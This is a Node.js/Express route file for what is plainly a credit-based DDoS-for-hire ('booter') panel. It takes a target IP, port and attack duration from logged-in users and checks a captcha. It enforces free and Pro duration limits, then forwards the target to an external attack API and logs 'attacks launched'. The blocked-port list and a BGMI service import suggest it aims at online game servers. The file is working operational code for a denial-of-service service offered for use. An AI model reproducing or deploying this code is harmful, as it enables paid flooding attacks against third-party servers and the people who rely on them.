const express = require('express');
const router = express.Router();
const auth = require('../middleware/authMiddleware');
const User = require('../models/User');
const axios = require('axios');
const Stats = require('../models/Stats');
const bgmiService = require('../services/bgmiService');
require('dotenv').config();

// ── In-memory attack tracker ──────────────────────────────────────────────────
const activeAttacks = new Map();

// ── Blocked ports ─────────────────────────────────────────────────────────────
const BLOCKED_PORTS = new Set([8700, 20000, 443, 17500, 9031, 20002, 20001]);

// ── Captcha blacklist ─────────────────────────────────────────────────────────
const usedCaptchaTokens = new Map();

function blacklistToken(token) {
    usedCaptchaTokens.set(token, Date.now() + 310_000);
    for (const [t, exp] of usedCaptchaTokens) {
        if (Date.now() > exp) usedCaptchaTokens.delete(t);
    }
}

function isTokenBlacklisted(token) {
    const exp = usedCaptchaTokens.get(token);
    if (!exp) return false;
    if (Date.now() > exp) { usedCaptchaTokens.delete(token); return false; }
    return true;
}

async function verifyTurnstile(token, ip) {
    if (!token || token.length < 10) return { success: false };
    if (isTokenBlacklisted(token)) return { success: false, 'error-codes': ['duplicate-use'] };
    try {
        const params = new URLSearchParams({
            secret: process.env.TURNSTILE_SECRET,
            response: token,
        });
        if (ip && ip !== '::1' && !ip.startsWith('::ffff:127')) {
            params.append('remoteip', ip);
        }
        const { data } = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            params,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        if (data.success) blacklistToken(token);
        return data;
    } catch {
        return { success: false };
    }
}

// ─── GET /api/panel/me ────────────────────────────────────────────────────────
router.get('/me', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json(user);
    } catch {
        res.status(500).json({ message: 'Server error' });
    }
});

// ─── GET /api/panel/attack-status ────────────────────────────────────────────
// Returns only what the frontend needs — NO server URLs exposed
router.get('/attack-status', auth, async (req, res) => {
    try {
        const attackInfo = activeAttacks.get(req.user.id.toString());

        if (!attackInfo) {
            return res.json({ success: true, data: { status: 'idle' } });
        }

        // Check if duration has elapsed
        const elapsed = Date.now() - new Date(attackInfo.startedAt).getTime();
        if (elapsed >= attackInfo.duration * 1000) {
            activeAttacks.delete(req.user.id.toString());
            return res.json({ success: true, data: { status: 'completed' } });
        }

        // ✅ Only return what the frontend needs — no bgmiServer URL
        return res.json({
            success: true,
            data: {
                status: 'running',
                ip: attackInfo.ip,
                port: attackInfo.port,
                duration: attackInfo.duration,
                startedAt: attackInfo.startedAt
            }
        });
    } catch (err) {
        console.error('Attack status error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

router.get('/stats', async (req, res) => {
  try {
    const stats = await Stats.findById('global');
    res.json({
      totalAttacks: stats?.totalAttacks || 0,
      totalUsers:   stats?.totalUsers   || 0,
    });
  } catch {
    res.status(500).json({ message: 'Server error' });
  }
});

// ─── POST /api/panel/attack ───────────────────────────────────────────────────
router.post('/attack', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });

        const { ip, port, duration, captchaToken } = req.body;

        if (!ip || !port || !duration)
            return res.status(400).json({ message: 'IP, port, and duration are required' });

        const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
        const captchaResult = await verifyTurnstile(captchaToken, clientIp);
        if (!captchaResult.success)
            return res.status(403).json({ message: 'Captcha verification failed. Please try again.' });

        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ip))
            return res.status(400).json({ message: 'Invalid IP address format' });

        const portNum = parseInt(port);
        if (isNaN(portNum) || portNum < 1 || portNum > 65535)
            return res.status(400).json({ message: 'Port must be between 1 and 65535' });

        if (BLOCKED_PORTS.has(portNum))
            return res.status(400).json({ message: `Port ${portNum} is blocked.` });

        const durNum = parseInt(duration);
        const MAX_DURATION = user.isPro ? 300 : 60;

        if (isNaN(durNum) || durNum < 1)
            return res.status(400).json({ message: 'Duration must be at least 1 second' });

        if (durNum > MAX_DURATION)
            return res.status(403).json({
                message: user.isPro
                    ? 'Duration cannot exceed 300 seconds'
                    : 'Free accounts limited to 60s. Upgrade to Pro for 300s.',
                maxDuration: MAX_DURATION,
                isPro: user.isPro,
            });

        if (user.credits < 1)
            return res.status(403).json({ message: 'Insufficient credits.', credits: user.credits });

        if (activeAttacks.has(user._id.toString()))
            return res.status(400).json({ message: 'You already have an attack running.' });

        // 🔥 Call external API
        const response = await axios.post(
            process.env.API_URL,
            { param1: ip, param2: portNum, param3: durNum },
            {
                headers: { 'Content-Type': 'application/json', 'x-api-key': process.env.API_KEY },
                timeout: 15000,
                validateStatus: () => true
            }
        );

        console.log(`[ATTACK] ${user.username} → ${ip}:${portNum} ${durNum}s | API: ${response.status}`);

        if (response.status !== 200 || response.data?.error) {
            if (response.data?.error?.includes('Max concurrent')) {
                return res.status(429).json({
                    message: 'Server busy. Please wait 5 seconds and try again.',
                    cooldown: 5
                });
            }
            return res.status(response.status || 400).json({
                message: response.data?.error || 'Failed to start attack'
            });
        }

        const startedAt = new Date().toISOString();

        activeAttacks.set(user._id.toString(), { ip, port: portNum, duration: durNum, startedAt });

        setTimeout(() => {
            activeAttacks.delete(user._id.toString());
        }, durNum * 1000 + 5000);

        const updated = await User.findByIdAndUpdate(
            user._id,
            { $inc: { credits: -1 } },
            { new: true }
        );

        await Stats.findByIdAndUpdate('global', { $inc: { totalAttacks: 1 } }, { upsert: true });

        console.log(`[SUCCESS] Attack launched : ${user.username} | Credits left: ${updated.credits}`);

        return res.json({
            message: 'Attack launched successfully',
            attack: { ip, port: portNum, duration: durNum, startedAt },
            credits: updated.credits,
            isPro: user.isPro,
        });

    } catch (err) {
        console.error(`[ERROR] Attack route: ${err.message}`);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

module.exports = router;